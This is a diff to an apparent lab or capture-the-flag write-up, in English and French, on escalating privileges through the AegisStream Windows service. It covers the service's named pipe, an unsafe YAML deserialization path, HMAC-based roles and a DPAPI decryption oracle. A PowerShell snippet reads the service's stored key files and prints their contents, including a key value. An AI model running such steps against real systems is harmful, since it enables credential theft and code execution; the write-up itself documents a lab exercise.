@@ -2036,6 +2036,199 @@ cd "C:\Program Files\Aegis Stream Collector"
 {% code overflow="wrap" %}
 ```powershell
  icacls "C:\Program Files\Aegis Stream Collector"
- # BUILTIN\Users:(I)(RX) 
+ # BUILTIN\Users:(I)(RX)
 ```
 {% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+ilspycmd AegisStreamSvc.dll > AegisStreamSvc_decompiled.cs
+ilspycmd AegisStreamWatchdog.dll > decompiled.cs
+```
+{% endcode %}
+
+**After debbging the app here is the critical things i've found**&#x20;
+
+{% hint style="info" %}
+1. **Named Pipe Access**: The service `AegisStreamSvc` listens on `\\.\pipe\AegisStreamMgmt`. Your user `svc-aegis-deploy` is a member of `AegisStream-Viewers`, which grants me permission to connect to this pipe.
+
+{% code overflow="wrap" %}
+```
+private static NamedPipeServerStream CreatePipe()
+string[] array = new string[3] { "AegisStream-Viewers", "AegisStream-Auditors", "AegisStream-Operators" };
+```
+{% endcode %}
+
+**And we are on the Viewers-Group**
+{% endhint %}
+
+{% hint style="info" %}
+1. **YAML Deserialization (RCE)**: The `CONFIG_IMPORT` command uses `YamlDotNet` with `TypeNameInTagNodeTypeResolver`. This is vulnerable to Unsafe YAML Deserialization. If we can send a malicious YAML payload, we can achieve Remote Code Execution (RCE) in the context of the service.
+
+{% code overflow="wrap" %}
+```c
+// Dans PipeServerWorker.HandleConfigImport()
+private async Task HandleConfigImport(NamedPipeServerStream pipe, Frame frame, CancellationToken ct)
+{
+    // 1. Le payload YAML est lu depuis le frame
+    string s = Encoding.UTF8.GetString(frame.Payload);
+    
+    // 2. ⭐ CRITICAL VULNERABILITY ⭐
+    IDeserializer val = new DeserializerBuilder()
+        .WithNodeTypeResolver((INodeTypeResolver)new TypeNameInTagNodeTypeResolver())  // ← DANGER !
+        .Build();
+    
+    // 3. Désérialisation en object générique
+    object config = val.Deserialize<object>((TextReader)new StringReader(s));
+    
+    // 4. Application de la config
+    _config.Apply(config);
+    await Reply(pipe, frame.ReqId, "OK", null, ct);
+}
+```
+{% endcode %}
+
+**Whats `TypeNameInTagNodeTypeResolver ?`**
+
+**It is a type resolver of YamlDotNet that allows the user to specify the.NET type to be instantiated directly into the YAML via YAML tags**
+
+**Why we have RCE here**
+
+**if we control the YAML input it get deserializing using** `TypeNameInTagNodeTypeResolver`
+
+**then it Instantiate any .NET class loaded in AppDomain then we call a method that edxecute this**&#x20;
+{% endhint %}
+
+{% hint style="info" %}
+1. **The Catch (Authentication)**: To execute `CONFIG_IMPORT`, we need the **Operator** role. The service authenticates clients by checking an HMAC-SHA256 signature against three keys: `ViewerKey`, `AuditorKey`, and `OperatorKey`.
+
+{% code overflow="wrap" %}
+```c
+// Dans PipeServerWorker - Table des rôles minimum requis
+private static readonly Dictionary<string, Role> MinRoles = new Dictionary<string, Role>(StringComparer.Ordinal)
+{
+    ["STREAM_LIST"]               = Role.Viewer,    // ← Le moins privilégié
+    ["STREAM_GET"]                = Role.Viewer,
+    ["STREAM_METRICS"]            = Role.Auditor,
+    ["STREAM_REPLAY"]             = Role.Auditor,
+    ["DIAG_DECRYPT_TELEMETRY_BLOB"] = Role.Viewer,
+    ["CONFIG_EXPORT"]             = Role.Operator,
+    ["CONFIG_IMPORT"]             = Role.Operator,  // ← ⭐ NOTRE CIBLE ⭐
+    ["MAINT_RELOAD"]              = Role.Operator
+};
+
+
+// Auth process
+private Role InferRoleFromSignature(Frame frame)
+{
+    byte[] data = frame.BodyForSignature();
+    
+    // Teste chaque clé dans l'ordre : Operator > Auditor > Viewer
+    (Role, byte[])[] array = new(Role, byte[])[3]
+    {
+        (Role.Operator, _keys.OperatorKey),   // ← Priorité 1
+        (Role.Auditor, _keys.AuditorKey),     // ← Priorité 2
+        (Role.Viewer, _keys.ViewerKey)        // ← Priorité 3
+    };
+    
+    for (int i = 0; i < array.Length; i++)
+    {
+        (Role, byte[]) tuple = array[i];
+        Role item = tuple.Item1;
+        byte[] item2 = tuple.Item2;
+        
+        // Calcule HMAC-SHA256(clé, données)
+        byte[] a = HmacUtil.ComputeHmacSha256(item2, data);
+        
+        // Compare en temps constant (anti timing attack)
+        if (HmacUtil.ConstantTimeEquals(a, frame.Signature))
+        {
+            return item;  // ← Rôle attribué si la signature correspond
+        }
+    }
+    return Role.None;  // ← Aucune clé ne matche
+}
+```
+{% endcode %}
+{% endhint %}
+
+{% hint style="info" %}
+1. **Key are leaked we have they're location**
+
+{% code overflow="wrap" %}
+```c
+// Dans KeyStore.LoadOrBootstrap()
+public void LoadOrBootstrap()
+{
+    EnsureDataDirs();  // ← Crée les dossiers
+    
+    // ⭐ ÉTAPE 1 : GÉNÉRATION EN CLAIRE ⭐
+    if (!File.Exists("C:\\ProgramData\\AegisStream\\keys\\viewer.key"))
+    {
+        GenerateAndWriteCleartext("C:\\ProgramData\\AegisStream\\keys\\viewer.key");
+    }
+    if (!File.Exists("C:\\ProgramData\\AegisStream\\keys\\auditor.key"))
+    {
+        GenerateAndWriteCleartext("C:\\ProgramData\\AegisStream\\keys\\auditor.key");
+    }
+    if (!File.Exists("C:\\ProgramData\\AegisStream\\keys\\operator.key"))
+    {
+        GenerateAndWriteCleartext("C:\\ProgramData\\AegisStream\\keys\\operator.key");
+    }
+    
+    // ⭐ ÉTAPE 2 : CHIFFREMENT DE L'OPÉRATEUR ⭐
+    if (!File.Exists("C:\\ProgramData\\AegisStream\\keys\\operator.key.enc") || 
+        !File.Exists("C:\\ProgramData\\AegisStream\\dpapi\\operator.wrap.bin"))
+    {
+        BootstrapOperatorEncryption();  // ← Chiffre operator.key
+    }
+    
+    // ⭐ ÉTAPE 3 : CHARGEMENT EN MÉMOIRE ⭐
+    _viewerKey = File.ReadAllBytes("C:\\ProgramData\\AegisStream\\keys\\viewer.key");
+    _auditorKey = File.ReadAllBytes("C:\\ProgramData\\AegisStream\\keys\\auditor.key");
+    _operatorKey = LoadOperatorKeyEncrypted();  // ← Via DPAPI
+}
+```
+{% endcode %}
+{% endhint %}
+
+**Attack chain :**&#x20;
+
+### <mark style="color:red;">PHASE 1 : Oracle DPAPI - Récupérer la KEK</mark>
+
+{% hint style="info" %}
+**Entrée : operator.wrap.bin (chiffré par DPAPI)**&#x20;
+
+**Oracle : DIAG\_DECRYPT\_TELEMETRY\_BLOB (via le pipe)**&#x20;
+
+**Sortie : KEK en clair (la clé AES)**
+
+**F**
+
+**But since the svc stream can decypt, the service also exposed  this function `DIAG_DECRYPT_TELEMETRY_BLOBb` it do the same**
+{% endhint %}
+
+{% code overflow="wrap" %}
+```powershell
+# Lire viewer.key (nécessaire pour signer nos requêtes)
+$viewerKey = [IO.File]::ReadAllBytes('C:\ProgramData\AegisStream\keys\viewer.key')
+$viewerKeyHex = [BitConverter]::ToString($viewerKey) -replace '-', ''
+Write-Host "VIEWER_KEY: $viewerKeyHex"
+
+# Lire operator.wrap.bin (ce qu'on va envoyer à l'oracle)
+$wrapBlob = [IO.File]::ReadAllBytes('C:\ProgramData\AegisStream\dpapi\operator.wrap.bin')
+$wrapBlobHex = [BitConverter]::ToString($wrapBlob) -replace '-', ''
+Write-Host "WRAP_BLOB: $wrapBlobHex"
+
+# Lire operator.key.enc (ce qu'on décryptera plus tard)
+$encBlob = [IO.File]::ReadAllBytes('C:\ProgramData\AegisStream\keys\operator.key.enc')
+$encBlobB64 = [Convert]::ToBase64String($encBlob)
+Write-Host "ENC_BLOB_B64: $encBlobB64"
+
+VIEWER_KEY: 6204420823D72023C616D14BC0A5DFA35F549788B1ED8A970B92CF1991AC8FA6
+WRAP_BLOB: 01000000D08C9DDF0115D1118C7A00C04FC297EB010000007506668C60F21F48B4941EAACA7C023F000000000200000000001066000000010000200000004FF39E66CD74FC52BC9CDE8B6A48024A938184829D124F05891765D64BA77396000000000E8000000002000020000000356BA0F19F812C47EDBB533A37A91F8954C02BDD21721EBE59F02F41444CE02330000000D4F060875B0A2AFC8F70F2114477BD185681E9E2975C8E6ACE3C1D1115886EE59A6113A159067482128AAFAFC7BAC8C44000000035C411553CB55993BC0E86C808B9BCD1963D1C1F3151B823AA53FEAF7F2E626C86D660B0C3C35298A31FE2D255A1745C52F1C14DCE20F34BAAAABDF50CCF0645
+ENC_BLOB_B64: 1TZcBcBcDvenMAy7WxkiJ/+MVOcAT1ri6P8T8WW1nBPuBv7YGBqHBdUu+xZpzbqRG4kCehfmy2bG70to
+```
+{% endcode %}
+
+<br>
